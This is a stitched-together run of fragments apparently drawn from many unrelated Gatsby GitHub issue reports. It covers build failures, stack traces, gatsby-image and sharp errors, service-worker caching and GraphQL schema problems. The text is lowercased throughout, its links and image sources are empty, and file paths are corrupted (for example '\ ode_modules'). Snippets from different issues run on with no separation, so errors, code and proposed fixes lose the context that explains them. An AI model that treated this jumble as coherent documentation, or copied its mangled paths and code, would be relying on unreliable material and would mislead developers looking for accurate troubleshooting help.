<img width="214" alt="2020-04-10_12h15_45" src=" "> example project using v2.20.15:
same project using v2.20.14: downgrading v2.20.15 to v2.20.14 solved the issue for me.
pages are still periodically emitted
this is due to the fact that the pages are not always emitted in the same order, causing the keys in `.cache/async-requires.js` to be written in a different order and producing a different hash for the module, and the build
**potential solution** i believe all we need to do is [sort the keys in this function]( #l54)
.uniqby(c => c.componentchunkname) // after
.uniqby(c => c.componentchunkname)
.orderby(c => c.componentchunkname) ``` i'm happy to open a pr if a maintainer can +1 this idea.
nothing to add than description above, sorry.
![gatsby-prism-issue](
![image](
"typeerror: cannot read property \'publicurl\' of undefined"
homepage is broken
styles arent loaded properly
many times i see the error: - "response code 429 (too many requests)"
firefox is broken and something is causing the website to not load properly.
![image](
throws error above.
render is printed twice
(navigate is reloading the page even when its parameter is equal to the current path)
at the very least, the behavior should be consistent
also, if you remove the `global` variable and the if statement, i assume render will be printed an infinite amount of times (infinite loop).
the special styles used to polyfill `object-fit` properties to ie 11 are only applied to the actual image.
all the styling done on the page through scss variables are being invalid.
click event is not triggered
i get this as my html, which has `this is the head` within the `body`: ```html
<html> <head> <meta charset="utf-8" /> <meta http-equiv="x-ua-compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> <meta name="note" content="environment=development" /> <title data-react-helmet="true"></title> <link type="text/css" rel="stylesheet" href="blob: " /> </head> <body> <div>this is the head</div> <script src="/socket.io/socket.io.js"></script> <div id="header">header</div> <div id="___gatsby"> <div tabindex="-1" id="gatsby-focus-wrapper" style="outline: none;"> <div class="container-fluid"> <div class="row"> <div class="col"><div id="banner"></div></div> </div> </div> </div> <div id="gatsby-announcer" aria-live="assertive" aria-atomic="true" style="position: absolute; top: 0px; width: 1px; height: 1px; padding: 0px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border: 0px;" ></div> </div> <div id="footer">footer</div> <script src="/commons.js"></script> </body>
most of the time no alert and no updated service worker
if offline, pages won't load (sometimes they will if already visited - but that's even hit and miss)
_edit 4/5/20_ - i've been ably to get the cache to work offline, but only by force clearing the old service worker
for some reason, it just won't leave and be replaced w/the updated one (that's larger in size)
in gatsby-browser.js, the example from the site to give the user the option to reload won't fire
and unregistering the service worker
with gatsby-plugin-remove-serviceworker, doesn't seem to register either.
it return error when i start running gatsby develop
![image](
there's a compiler error stating that multiple root queries are found
i have a static query defined in my layout component (layout.js) and a query in my about page (pages/about.js) that are both attempting to render the site metadata's title.
`getnode` returns null
gatsby fails with ```
error in "[hiddenforprivacy]/node_modules/gatsby-source-graphql/gatsby-node.js": cannot find module \'./batching/dataloader-link\'
just text: ```
view plugin on github see starters using this
``` <img width="384" alt="screenshot" src=" "> ### affected plugins: i found so far for `readme.md`:
-
-
-
-
-
-
-
- i found so far for `error: no readme data found!`:
-
in production: blank page
in development: this error - ```
typeerror: cannot read property 'getelementsbytagname' of null
(anonymous function)
/users/eliran/code/gatsby/zeitouni/.cache/navigation.js:173 170 | if (document.title) { 171 | pagename = document.title 172 | }
> 173 | const pageheadings = document 174 | .getelementbyid(`gatsby-focus-wrapper`) 175 | .getelementsbytagname(`h1`) 176 | if (pageheadings && pageheadings.length) {
``` sandbox with the complete ```navigation.js``` file:
it is included in `commons` chunk now.
installation failure
see:
as said, i am able to install `sharp` separately: node v13.9.0
404 page ### related issues - #22431 `update docs/processing-payments-with-stripe`
- #19849 `bug(starters): starter pages are not created for some starter repos` - #19267 `add link checker for gatsby docs`
current status on - the anchor links in the toc are not working (to `#about`)
- a anchor link is created with `about-the-project-a-nameabouta` ```html
<h3 id="about-the-project-a-nameabouta" style="position:relative" class="css-0"> <a aria-label="about the project a nameabouta permalink" class="anchor before css-0" href="#about-the-project-a-nameabouta"> <svg aria-hidden="true" focusable="false" height="16" version="1.1" viewbox="0 0 16 16" width="16"> <path fill-rule="evenodd" d="m4 9h1v1h4c-1.5 0-3-1.69-3-3.5s2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25v8.59c.58-.45 1-1.27 1-2.09c10 5.22 8.98 4 8 4h4c-.98 0-2 1.22-2 2.5s3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5s13.98 12 13 12h9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09v6.25c-1.09.53-2 1.84-2 3.25c6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5s14.5 6 13 6z"></path> </svg> </a> about the project <a name="about" class="css-0"></a>
``` ### related issues - #22548 `(blog) service relief project`
- #19267 `add link checker for gatsby docs`
10:33:13 am: typeerror: cannot read property 'map' of undefined - utils.js:148 handlewebhookupdate [www]/[gatsby-source-drupal]/utils.js:148:70 - gatsby-node.js:217 [www]/[gatsby-source-drupal]/gatsby-node.js:217:20 - layer.js:95 layer.handle [as handle_request] [www]/[express]/lib/router/layer.js:95:5 - index.js:317 trim_prefix [www]/[express]/lib/router/index.js:317:13 - index.js:284 [www]/[express]/lib/router/index.js:284:7 - index.js:335 function.process_params [www]/[express]/lib/router/index.js:335:12 - index.js:275 next [www]/[express]/lib/router/index.js:275:10 - read.js:130 [www]/[body-parser]/lib/read.js:130:5 - index.js:224 invokecallback [www]/[raw-body]/index.js:224:16 - index.js:213 done [www]/[raw-body]/index.js:213:7 - index.js:273 incomingmessage.onend [www]/[raw-body]/index.js:273:7 - task_queues.js:84 processticksandrejections internal/process/task_queues.js:84:21
an invalid `rel` is generated.
the styling is quite different
the develop site works as expected
the build site has the the css inline in the head tag but outside of any other tag
just appears as rendered text in the browser.
the lqip doesn't line up with the fully loaded image
the page flashed, showing the header and styles initially, but then showed the main body of the page without a header/footer
recording: screenshot:
![image](
the opacity value is 1%
thank you in advance!
white screen ### other things i tried - not in the reproduction, but in my own project, i tried changing the start_url in my gatsby-plugin-manifest object.
- i tried this with the path-prefix instructions
- i tried it without ### note i am not sure if adding path-prefix add this to all my files, or if it just adds it to the index
if so, is it causing a collision with the currently existing blog.js? not entirely sure how this works
i would just like to have the site start at my already exisiting blog page instead of the root domain
any help is greatly appreciated, thanks!
see above - -pages don't load.
when the plugin is initialized, it throws the error above.
`fit: inside`
the image is stretched to original size
![image]( ![image]( gatsby-image [touch this issue]( #avoiding-stretched-images-using-the-fluid-type) but gatsby-remark-images doesn't get correct `presentationwidth`
it set original width as `presentationwidth`.
`gatsby build` fails with an error like
can't resolve '../../public/static/d/856328897.json' in '/path/to/src/components
`currentdata` is undefined and throws an error
the stack trace points to the `gatsby-image` package, `getcurrentsrcdata` method
it seems like the image has been detected to be in cache (via the `inimagecache` method), but the actual source can't be found afterwards
note that the image is being fetched and processed correctly (you can query it in graphiql) - it's a render error
the error is thrown in both dev and prod builds, including when deploying to netlify (clean environment).
`pageresources === undefined`
![screen shot 2020-03-27 at 7 34 02 pm](
i get the error mentioned in the description section of this issue.
no actionable information
error building static html failed for path "/home/", "/404/" or any dynamic page created by gatbsy-node file
<img width="1061" alt="screen shot 2020-03-26 at 9 50 39 am" src=" ">
active users can be observed but no reflection is found in users graph
![image](
- the page flashes for a fraction of a second until the styles are applied
described above
c:\\users\\ctsyg\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\ ode_modules\\yoga-layout-prebuilt\\yoga-layout\\build\ elease\ bind.js:53 throw ex; ^ error: package exports for 'c:\\users\\ctsyg\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\ ode_modules\\clipboardy' do not define a '.' subpath at resolveexports (internal/modules/cjs/loader.js:419:17) at function.module._findpath (internal/modules/cjs/loader.js:492:20) at function.module._resolvefilename (internal/modules/cjs/loader.js:787:27) at function.module._load (internal/modules/cjs/loader.js:693:27) at module.require (internal/modules/cjs/loader.js:864:19) at require (internal/modules/cjs/helpers.js:74:18) at object.<anonymous> (c:\\users\\ctsyg\\appdata\ oaming\ pm\ ode_modules\\gatsby-cli\\lib\\create-cli.js:24:20) at module._compile (internal/modules/cjs/loader.js:971:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1011:10) at module.load (internal/modules/cjs/loader.js:822:32) { code: 'module_not_found'
> gatsby build # ...
failed building static html for pages - 0.435s error #95313 building static html failed for path "/" see our docs page for more info on this error: 3 | 4 | const indexpage = () => {
> 5 | const [context] = usecontext(context) | ^ 6 | 7 | return <div>hello world: {json.stringify(context)}</div> 8 | } webpackerror: typeerror: object is not iterable (cannot read property symbol(symbol.iterator)) - index.js:5 indexpage src/pages/index.js:5:21 - index.js:17 promise._resolvefromexecutor node_modules/prop-types/index.js:17:1 error command failed with exit code 1.
info visit for documentation about this command.
there is an "unexpected token" error
``` error #98123 webpack generating ssr bundle failed
build will still be tracked.
see screesnhot:
build times of .mdx were between 18 and 34 times longer for the source and transform nodes step vs
stuck in build step
$ yarn build error #11321 plugin "gatsby-node.js" threw an error while running the createpages lifecycle: (acc[key] || []).concat is not a function failed createpages - 0.064s error #85901 graphql there was an error in your graphql query: (acc[key] || []).concat is not a function 1 | query usersstephencodeblogsrcpagestagsjsx3450235017 { 2 | site { 3 | sitemetadata { 4 | title 5 | } 6 | } 7 | allmarkdownremark(limit: 2000) {
> 8 | group(field: frontmatter___tags) { | ^ 9 | fieldvalue 10 | totalcount 11 | } 12 | } 13 | } 14 | file path: /users/stephen/code/blog/src/pages/tags.jsx
url path: /tags/
plugin: none
page displays cached version.
error: `error the node internal.owner field is set automatically by gatsby and not by plugins` ### related issues - #22455 `fix(www): remove comments that are causing builds to fail`
however, for the account `@z1219202167`, i got 3 posts
for `@max_uf`, i got 4 posts.
the image is appearing blur in blog detail page added using netlify cms **[demo](
an element earlier in the page flow scrolls l into place upon page load.
described above
sidenote: if i change the `@link`ed field to the un-proxied one (`transfer-id`), i get
typeerror: cannot read property 'type' of undefined at /users/cml/src/lgu-app/node_modules/gatsby/dist/schema/node-model.js:564:48 at array.foreach (<anonymous>) at determineresolvablefields (/users/cml/src/lgu-app/node_modules/gatsby/dist/schema/node-model.js:561:23) at localnodemodel.runquery (/users/cml/src/lgu-app/node_modules/gatsby/dist/schema/node-model.js:190:29) at contextualnodemodel.runquery (/users/cml/src/lgu-app/node_modules/gatsby/dist/schema/node-model.js:405:27) at /users/cml/src/lgu-app/node_modules/gatsby/dist/schema/resolvers.js:187:42 at processticksandrejections (internal/process/task_queues.js:97:5) at async promise.all (index 2) at async promise.all (index 0) at async promise.all (index 0) at async promise.all (index 0)
...i think because i don't have the un-proxied one in my schema.
the plugin incorrectly uses `.` as the file extension
going to site root gives the github pages 404, but going to a subpage, like /about etc
will load the site properly, and the site works from there
however, reloading on / gives the 404
eventually the issue solves itself but i'd like to know why.
gatsby cloud ran the build without the prefix (it seems)
any clue if this is a bug or if there's something i'm missing? my blog is open-source and is located here:
$ jest --all --testnamepattern foo fail src/components/foo/foo.unit.spec.tsx test suite failed to run typescript diagnostics (customize using `[jest-config].globals.ts-jest.diagnostics` option): src/components/foo/foo.unit.spec.tsx:9:15 - error ts2339: property 'mockimplementationonce' does not exist on type 'typeof staticquery'
9 staticquery.mockimplementationonce(({ render }) => ~~~~~~~~~~~~~~~~~~~~~~ src/components/foo/foo.unit.spec.tsx:9:41 - error ts7031: binding element 'render' implicitly has an 'any' type
9 staticquery.mockimplementationonce(({ render }) => ~~~~~~ test suites: 1 failed, 1 of 7 total
tests: 0 total
snapshots: 0 total
transform: translatez(0) and transform: translatey(5%) translatez(0)
frontmatter urls get manipulated by graphql queries to be relative paths.
error is thrown ```
module build failed (from ./node_modules/postcss-loader/src/index.js):
syntaxerror (1:1) unknown word > 1 | // empty (null-loader)
``` ### related issue * ### note
* please suggest if there is a better pattern how to exclude an asset from static build
two iframes are created.
error error when trying to parse schema, ignoring unable to find any graphql type defintions for the following pointers: c:\\homepage\\.cache\\fragments\\*.js error: unable to find any graphql type defintions for the following pointers: c:\\homepage\\.cache\\fragments \\*.js - load-typedefs.ts:91 object.loadtypedefs [homepage]/[graphql-toolkit]/src/loaders/load-typedefs.ts:91:11 - documents.ts:8 object.loaddocuments [homepage]/[graphql-toolkit]/src/loaders/documents.ts:8:10 error unhandled rejection cannot read property 'definitions' of undefined typeerror: cannot read property 'definitions' of undefined - index.cjs.js:397 [homepage]/[@graphql-toolkit]/common/index.cjs.js:397:69 - array.map - index.cjs.js:394 object.validategraphqldocuments [homepage]/[@graphql-toolkit]/common/index.cjs.js:394:50 - index.cjs.js:88 object.codegen [homepage]/[@graphql-codegen]/core/index.cjs.js:88:24
an error in the terminal
` error problems with gatsby-source-contentful plugin options:
spaceid: undefined - "spaceid" is required
accesstoken: undefined - "accesstoken" is required
host (default value): "cdn.contentful.com"
environment (default value): "master"
downloadlocal (default value): false
localefilter (default value): [function]
forcefullsync (default value): false
pagelimit (default value): 100
usenameforid (default value): true`
build error #95313
typeerror: ___loader.enqueue is not a function 24 | 25 | it('should display the megamenu on hover', () => { > 26 | const { getbytext } = render(<desktopnav {...props} />); | ^ 27 | getbytext('dashboard'); 28 | }); console.error node_modules/react-dom/cjs/react-dom.development.js:21843 the above error occurred in the <gatsbylink> component: in gatsbylink (created by forwardref) in forwardref (created by sitelink) in sitelink (created by toplevelnav) in li (created by toplevelnav) in toplevelnav (created by desktopnav) in ul (created by styled.ul) in styled.ul (created by desktopnav) in div (created by styled.div) in styled.div (created by desktopnav) in desktopnav in themeprovider in intlprovider in provider consider adding an error boundary to your tree to customize error handling behavior
visit to learn more about error boundaries
console.error node_modules/react-dom/cjs/react-dom.development.js:21843 the above error occurred in the <gatsbylink> component: in gatsbylink (created by forwardref) in forwardref (created by sitelink) in sitelink (created by toplevelnav) in li (created by toplevelnav) in toplevelnav (created by desktopnav) in ul (created by styled.ul) in styled.ul (created by desktopnav) in div (created by styled.div) in styled.div (created by desktopnav) in desktopnav in themeprovider in intlprovider in provider consider adding an error boundary to your tree to customize error handling behavior
visit to learn more about error boundaries
no language is visible
first element after the react.fragment get\'s the id "gatsby-announcer"
the starter throws errors immediately
the value is `null`, even though i can add a console.log to the plugin that shows the correct value
when i want to overwrite the default `runtimecaching`, i find it impossible, because `_.merge()` do **merge** the two object
see code [here]( #l154).
the following html is rendered for the html component: ```js
<div description="this is a foobar" citation="by some genius"></div>
see
getting error error plugin gatsby-plugin-sitemap returned an error
syntaxerror: unexpected template string
typos are resolved
the preview server crashes with this error: ```
16:41:00 pm: typeerror: cannot destructure property `attributes` of 'undefined' or 'null'
- normalize.js:16 nodefromdata [www]/[gatsby-source-drupal]/normalize.js:16:9 - utils.js:112 handlewebhookupdate [www]/[gatsby-source-drupal]/utils.js:112:19 - gatsby-node.js:184 [www]/[gatsby-source-drupal]/gatsby-node.js:184:11 - layer.js:95 layer.handle [as handle_request] [www]/[express]/lib/router/layer.js:95:5 - index.js:317 trim_prefix [www]/[express]/lib/router/index.js:317:13 - index.js:284 [www]/[express]/lib/router/index.js:284:7 - index.js:335 function.process_params [www]/[express]/lib/router/index.js:335:12 - index.js:275 next [www]/[express]/lib/router/index.js:275:10 - read.js:130 [www]/[body-parser]/lib/read.js:130:5 - index.js:224 invokecallback [www]/[raw-body]/index.js:224:16 - index.js:213 done [www]/[raw-body]/index.js:213:7 - index.js:273 incomingmessage.onend [www]/[raw-body]/index.js:273:7 - task_queues.js:80 processticksandrejections internal/process/task_queues.js:80:21 ```
encountered this error.
accessing your contentful space failed.
try setting gatsby_contentful_offline=true to see if we can serve from cache.
texts gets selected, you can drag it etc
build fails.
i get the following error in my browser:
typeerror: cannot read property 'map' of null
it wrongfully indicates that there are types with the same name.
in most cases the traced svg placeholder is not aligned with the actual image in internet explorer (tested with ie 11)
it looks like this: ![original](
this throws an error because `navigate()` returns `undefined` instead of an expected `promise` (see [type]( #l3))
looks like `gatsby-link` is wrapping that function using a global variable:
#l202-l204 instead of `@reach/router`'s `navigate` as indicated in the types
when i use the one from `@reach/router`, it works, but is it safe to do so?
the starter hello-world project gives an error related to a babel helper plugin
error #98123 webpack generating ssr bundle failed [babel] ~/gatsby-tests/test/.cache/develop-static-entry.js: no "exports" main resolved in ~/gatsby-tests/test/node_modules/@babel/helper-compilation-targets/package.json file: .cache/develop-static-entry.js
the following error message is thrown:
``` error #11321 plugin "gatsby-source-graphql" threw an error while running the sourcenodes lifecycle: schema must contain uniquely named types but contains multiple types named "cachecontrolscope"
99 | }; 100 | > 101 | const schema = transformschema({ | ^ 102 | schema: introspectionschema, 103 | link 104 | }, [new stripnonquerytransform(), new renametypes(name => `${typename}_${name}`), new namespaceunderfieldtransform({ file: node_modules/gatsby-source-graphql/gatsby-node.js:101:18 error: schema must contain uniquely named types but contains multiple types na med "cachecontrolscope"
- array.reduce - array.reduce - map.js:88 object.mapschema [gatsby-starter-default]/[graphql-tools-fork]/dist/utils/map.js:88:12 - clone.js:58 object.cloneschema [gatsby-starter-default]/[graphql-tools-fork]/dist/utils/clone.js:58:18 - transformschema.js:11 wrapschema [gatsby-starter-default]/[graphql-tools-fork]/dist/transforms/transformschem a.js:11:26 - transformschema.js:31 transformschema [gatsby-starter-default]/[graphql-tools-fork]/dist/transforms/transformschem a.js:31:18 - gatsby-node.js:101 object.exports.sourcenodes [gatsby-starter-default]/[gatsby-source-graphql]/gatsby-node.js:101:18
build failed
nothing happens until you press back a lot of times (as many as your `gatsby default starter` clicks)
the image only displays when the code above is put into `index.js` and not when i use it from a component.
from the same query, i get a result into the graphql api : ```
{ "data": { "file": { "childimagesharp": { "fluid": { "base64": "data:image/jpeg;base64,/9j/2wbdaaggbgcgbqghbwcjcqgkdbqndasldbksew8uhrofhh0ahbwgjc4nicisixwckdcpldaxndq0hyc5ptgypc4zndl/2wbdaqkjcqwldbgndrgyirwhmjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjiymjl/wgarcaalabqdasiaahebaxeb/8qafwaaaweaaaaaaaaaaaaaaaaaaaqgav/eabybaqebaaaaaaaaaaaaaaaaaaiba//aaawdaqaceamqaaabz1zjkqxqmg//xaabeaeaagidaaaaaaaaaaaaaaabaamcbbesiv/aaagbaqabbqkrt926ubt0idlssic//8qafhebaqeaaaaaaaaaaaaaaaaaabeb/9oacaedaqe/azip/8qafxebaqebaaaaaaaaaaaaaaaaaqarev/aaagbagebpwhvbq//xaaeeaaabacaaaaaaaaaaaaaaaaaaraxahesisijuf/aaagbaqagpwlywiqhefuuqzp/xaaaeaeaawebaqaaaaaaaaaaaaababehmuhb/9oacaebaae/iulyrujh5ht+s7pkahqjomnme//aaawdaqacaamaaaaqmn//xaaweqebaqaaaaaaaaaaaaaaaaaberd/2gaiaqmbat8qajm//8qafhebaqeaaaaaaaaaaaaaaaaaeqah/9oacaecaqe/enxjx//eabsqaqebaqeaawaaaaaaaaaaaaeriqaxuzhx/9oacaebaae/ekd0qpshpvqcnpz2darhycgaufgcrplkwpbfnsnl/oow+rv/2q==", "aspectratio": 1.7777777777777777, "src": "/static/d42542b913d6a0df2f720e43556b3a8b/f2cbb/underconstruction.jpg", "srcset": "/static/d42542b913d6a0df2f720e43556b3a8b/8850c/underconstruction.jpg 200w,\ /static/d42542b913d6a0df2f720e43556b3a8b/da113/underconstruction.jpg 400w,\ /static/d42542b913d6a0df2f720e43556b3a8b/f2cbb/underconstruction.jpg 800w,\ /static/d42542b913d6a0df2f720e43556b3a8b/1789c/underconstruction.jpg 960w", "sizes": "(max-width: 800px) 100vw, 800px", "originalname": "underconstruction.jpg" } } } }
``` am i missing something ?
the `<div class="layout">` gets replaced with `<div class="post-excerpt-first first-post-in-list">` only difference is `<div>` tag replaced with `<article>` tag
[
it should connect without following errors when i add gatsby-transformer-sharp:-
error in "/app/node_modules/gatsby-plugin-sharp/gatsby-node.js": \'linux-x64\' binaries cannot be used on the \'linuxmusl-x64\' platform
please remove the 'node_modules/sharp/vendor' directory and run 'npm install'
error: 'linux-x64' binaries cannot be used on the 'linuxmusl-x64' platform
pl ease remove the 'node_modules/sharp/vendor' directory and run 'npm install'
- libvips.js:67 object.hasvendoredlibvips [app]/[sharp]/lib/libvips.js:67:13
- constructor.js:8 object.<anonymous>
[app]/[sharp]/lib/constructor.js:8:22
- v8-compile-cache.js:178 module._compile
[app]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:789 object.module._extensions..js
internal/modules/cjs/loader.js:789:10 - loader.js:653 module.load
internal/modules/cjs/loader.js:653:32
- loader.js:593 trymoduleload internal/modules/cjs/loader.js:593:12
- loader.js:585 function.module._load
internal/modules/cjs/loader.js:585:3
- loader.js:692 module.require internal/modules/cjs/loader.js:692:17 - v8-compile-cache.js:159 require
[app]/[v8-compile-cache]/v8-compile-cache.js:159:20 - index.js:3 object.<anonymous> [app]/[sharp]/lib/index.js:3:15 - v8-compile-cache.js:178 module._compile [app]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:789 object.module._extensions..js internal/modules/cjs/loader.js:789:10 - loader.js:653 module.load internal/modules/cjs/loader.js:653:32 - loader.js:593 trymoduleload internal/modules/cjs/loader.js:593:12 - loader.js:585 function.module._load
internal/modules/cjs/loader.js:585:3 - loader.js:692 module.require internal/modules/cjs/loader.js:692:17
got new ts error ```sh
error ts1259: module \'"/users/justfly/projects/poolotto-gatsby/node_modules/@types/configstore/index"\' can only be default-imported using the \'esmoduleinterop\' flag 1 import configstore from "configstore" ~~~~~~~~~~~ node_modules/@types/configstore/index.d.ts:6:1 6 export = configstore; ~~~~~~~~~~~~~~~~~~~~~ this module is declared with using \'export =\', and can only be used with a default import when using the \'esmoduleinterop\' flag
found 1 error
error command failed with exit code 1.
browsers trip over all affected attributes
in my case (latest firefox), the attribute is silently ignored.
headersection logo is file node
features icon is **string** node
a direct-id lookup for this object does not work
looking up by other things, such as contentful_id, do work.
error `cannot read property 'some' of undefined`
new components have class names (and styles) of existing elements.
![screenshot from 2020-03-05 12-23-02](
i got the error that i posted.
page breaks and renders nothing.
hot-reloading doesn't pick up my changes to this json file.
i see the below error: error: it appears like gatsby is misconfigured
gatsby related `graphql` calls are supposed to only be evaluated at compile time, and then compiled away
unfortunately, something went wrong and the query was left in the compiled code
unless your site has a complex or custom babel/gatsby configuration this is likely a bug in gatsby.
onload callback is never called
the blurred image is never swapped with the full-size variant
there's infinite reload loop, if using `require.resolve()` in one of the entrypoints gatsby's webpack-dev-server uses.
it shows a blank page
crash on develop/build.
all articles appears unread.
gatsby seems to get stuck forever at "building development bundle".
build fails; some trace appears to be missing (can't be sure about this, it's the first time i've tried it!)
failure: ``` error recorder._timedout is not a function typeerror: recorder._timedout is not a function - zipkin-local.js:56 [project]/[gatsby]/dist/utils/tracer/zipkin-local.js:56:18 - map.foreach - zipkin-local.js:55 object.stop [project]/[gatsby]/dist/utils/tracer/zipkin-local.js:55:25 - index.js:39 stoptracer [project]/[gatsby]/dist/utils/tracer/index.js:39:26 - build.js:190 build [project]/[gatsby]/dist/commands/build.js:190:9
``` it looks like the function in question [may have moved]( a while ago.
displayed white page, and show this errors in console
react-dom.production.min.js:4684 typeerror: cannot read property 'tags' of undefined at filtered-starters.js:280 at array.filter (<anonymous>) at filtered-starters.js:279 at n.render (filtered-starters.js:93) at qi (react-dom.production.min.js:4289) at ki (react-dom.production.min.js:4280) at so (react-dom.production.min.js:6722) at hu (react-dom.production.min.js:5696) at pu (react-dom.production.min.js:5685) at au (react-dom.production.min.js:5441)
the latex in the markdown appears unmodified.
build fails.
there is none.
there is one in the `offline-plugin-app-shell-fallback` folder though.
two different strings produce the same digest if they are turned into buffers and they have the same length
the frontmatter doesn reload.
code is not formatted
no errors occur.
preload links are not written in html files with a non-trailing-slash path, if asset map contains the same path with a trailing slash as a key for the assets
the styles aren't propagated.
info installing packages..
> **sharp@0.23.4 install** h:\\projects\\webapp\ ode_modules\\sharp
> (node install/libvips && node install/dll-copy && prebuild-install) || (node-gyp rebuild && node install/dll-copy) info sharp downloading
**err! sharp self signed certificate in certificate chain**
info sharp attempting to build from source via node-gyp but this may fail due to the above error
info sharp please see for required dependencies h:\\projects\\webapp\ ode_modules\\sharp>if not defined npm_config_node_gyp (node "c:\\program files\ odejs\ ode_modules\ pm\ ode_modules\ pm-lifecycle\ ode-gyp-bin\\\\..\\..\ ode_modules\ ode-gyp\\bin\ ode-gyp.js" rebuild ) else (node "c:\\program files\ odejs\ ode_modules\ pm\ ode_modules\ ode-gyp\\bin\ ode-gyp.js" rebuild )
gyp warn install got an error, rolling back install
gyp err! configure error
gyp err! stack error: self signed certificate in certificate chain
gyp err! stack at tlssocket.onconnectsecure (_tls_wrap.js:1321:34)
gyp err! stack at tlssocket.emit (events.js:223:5)
gyp err! stack at tlssocket._finishinit (_tls_wrap.js:794:8)
gyp err! stack at tlswrap.ssl.onhandshakedone (_tls_wrap.js:608:12)
gyp err! system windows_nt 10.0.17763
gyp err! command "c:\\\\program files\\\ odejs\\\ ode.exe" "c:\\\\program files\\\ odejs\\\ ode_modules\\\ pm\\\ ode_modules\\\ ode-gyp\\\\bin\\\ ode-gyp.js" "rebuild"
gyp err! cwd h:\\projects\\webapp\ ode_modules\\sharp
gyp err! node -v v12.14.1
gyp err! node-gyp -v v5.0.5
gyp err! not ok
error: command failed with exit code 1: npm install - error.js:56 makeerror [npm]/[gatsby-cli]/[execa]/lib/error.js:56:11 - index.js:114 handlepromise [npm]/[gatsby-cli]/[execa]/index.js:114:26 - task_queues.js:94 processticksandrejections internal/process/task_queues.js:94:5
seeing both the blurry/traced svg version and final image on top of eachother.
you can't use childimagesharp together with x.png use publicurl instead
the childimagesharp portion of the query in this file
will return null:
<meta name="twitter:creator" content="kyle mathews" data-react-helmet="true">
the error occurred
note the sub-title of the site: > written by `john doe` who lives and works in san francisco building useful things
you should follow him on twitter the `john doe` part can be changed from the default `kyle mathews`, but it is difficult to change its summary without changing the `bio.js` file.
i'm getting an error: ``` error #98123 webpack generating development javascript bundle failed unknown: identifier '_frontmatter' has already been declared (100:13) 98 | mdxcontent.ismdxcomponent = true; 99 | > 100 | export const _frontmatter = {}; | ^ 101 | file: src/pages/about.mdx:100:13 failed building development bundle - 2.828s
see error above.
the autocomplete doesn't work.
on route transitions, "navigated to..." accessibility text is being rendered to the page.
97% passing with the following failure: ```
<html> element does not have a [lang] attribute
it crashes with this error during schema building: ```
encountered an error trying to infer a graphql type for: `localfile___node`
there is no corresponding node with the `id` field matching: "095aab19-e6d7-5a4b-8ff6-20d90fddbcf8,416703e0-1119-5d00-a333-b5685f8cf111,93f700f7-2ea9-54de-83c5-788fb22968ba,3ffd006c-30ab-5952-99ae-0a434bb47e8f,1631f85a-9727-5071-8c29-795ba9b7d20a,dc126258-ee7a-578f-8caf-1e2a4ebfc559,11740726-6ca0-500f-8a36-390e89442c48,e89997bd-6e77-5928-bcc9-66352c7cd442,194f1000-0ee0-597b-8ff5-acebdf53e903,3eaed697-c28e-56f5-9dd1-1ab247932087,b3afc33c-8a61-5192-b055-10c2ef105e75"
``` here is a gist with the symptoms (including stack trace) and the output of `gatsby info`: the same symptom occurs when i upgrade all the gatsby-related packages: ### things i've tried turning *off* `downloadlocal` gets things working as expected
but i'd really like to avoid that so we can serve our own assets
in this case, gatsby startup seems to always re-download all of the assets
i e also tried deleting all references to assets altogether from the code, running `npx gatsby clean` (as suggested by the `gatsby-source-contentful` readme), and doing the steps to reproduce again, but i get the same crash symptom
### vague hypothesis after some debugging my current hypothesis is that `downloadlocal` pulls down all assets, regardless of graphql queries that are in the code, but that expectations are somehow mismatched among:
* the way `downloadlocal` work populates some cache
* the way the schema building is consuming from some cache (`nodestore`?)
* the way `gatsby_contentful_offline` is (or isn ) able to influence that combination
the output of the above markdown **actually is**: ```html
<p>please review our <a href="https:/static.howchoo.com/privacy">privacy policy</a> for more details.</p>
``` might be related: in addition, it also outputs `https:/` instead of `https://` (with one slash) for some reason ither way, it should just output `/privacy`
### additional notes: * root-relative links work elsewhere on the site (in normal react components etc.); this issue happens specifically when using root-relative links in `.mdx` files.
* asset prefixing for assets (images etc.) work as expected elsewhere on the site (in normal react components etc.)
content overlapping as shown below
![86cf2cca-e440-443b-9193-60655184c06a](
unexpected: `app-#####.js` still contains the polyfills
*however* if you completely remove node_modules folder and perform a new production build (after npm i) the polyfills are gone.
currently it 404s
~~i did figure out a work around, by prepending the site url the link works correctly after a couple second delay.~~ nvm, doesn't work, still gives 404 then routes on refresh.
build failed with the above result.
in demo-module--red--3laha is present
development: you get the gatsby 404 error page
production: the initial html is rendered, but react hydration fails
if you check the network tab, ` ` is 404.
"context is not defined" error is returned
hash is ignored and page does not scroll
`allcontentfulblogposts` doesn't have data until the query is edited and the page hot reloads (eg
`limit` changes from 10 to 9)
`page.path` is `unknown` because `page` is declared as a `node & tnode`.
see [this example](
existing metadata/icc profiles are stripped from generated webp files
axe believes the `region` rule has been violated after navigation has occurred
![image](
i am not able to query the inlinecount of the node i expect that field to be on with the error: `cannot query field "inlinecount" on type "markdownremarkfields"` ![cannot query field \\"inlinecount\\" on type \\"markdownremarkfields\\"]( which is strange, because running through the node debugger diving into the gatsby code, it seems that the `internal` value is being set on the node, as expected: ![a chrome debugger showing `node`\'s `inlinecount` being added properly in gatsby code](
the browser displayed the typerror
i also noticed that even after "new-page" was deleted, this development 404 page listed "new-page" under the available pages
refreshing npm by saving the last page i worked on resulted in the "new-page" being removed from the 404 development page, but the "new-page" url still gave the same error
it\'s possible that this could be an issue with me having only recently deleted the "new-page.js" file under "pages" folder
i\'m thinking that perhaps the name "new-page" is being interpreted as something other than the page\'s path somewhere in the code, and that perhaps "new-page" is seen as a property or something similar and thus is an invalid name
please let me know if you find any other seemingly invalid names for pages, or if "new-page" is a valid page name for you.
the image is served 4 times despite all being the same
the query produces an error: `cannot query field \\"compareatpricev2\\" on type \\"shopifyproductvariant\\"
did you mean \\"compareatprice\\"?"`
errors described above
